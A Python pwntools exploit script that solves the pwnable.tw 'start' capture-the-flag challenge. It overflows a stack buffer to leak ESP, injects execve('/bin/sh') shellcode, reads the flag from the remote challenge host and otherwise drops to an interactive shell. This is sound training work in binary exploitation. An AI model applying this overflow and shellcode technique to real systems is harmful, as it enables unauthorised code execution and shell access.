from pwn import *

def exploit(p):
	# 0x08048087: mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
	mov_esp_addr = p32(0x08048087)
	recvTxt = p.recvuntil(b'CTF:').decode("utf-8") 
	log.warning(f'{recvTxt+" PAYLOAD INJECTED"}')
	p.send(b"A"*20 + mov_esp_addr)
	esp = u32(p.recv()[:4])
	log.info(f"Found ESP at {hex(esp)}")

	shellcode = asm('\n'.join([
	    'xor edx, edx',
	    'xor ecx, ecx',
	    'push %d' % u32(b'/sh\0'),
	    'push %d' % u32(b'/bin'),
	    'mov ebx, esp', # const char *filename
	    'mov eax, 0xb', # execve 
	    'int 0x80',
	]))
	
	# we need to add 20 bytes to our ESP pointer, as the first 20 bytes 
  # are just junk; we want to drop into the shellcode right away.
	payload = b"Y"*20 + p32(esp+20) + shellcode 
	p.send(payload)
	try:
		p.send(b'cat /home/start/flag\n')
		flag = p.recvuntil(b't4rt}').decode("utf-8") 
		log.info(f'Flag found!!! {flag}')
	except:
		p.interactive()
		p.exit()

if __name__ == "__main__":
	#context.log_level = 1
	context.binary = "./start"
	#p = process("./start")
	p = remote('chall.pwnable.tw', 10000)
	#gdb.attach(p)
	exploit(p)
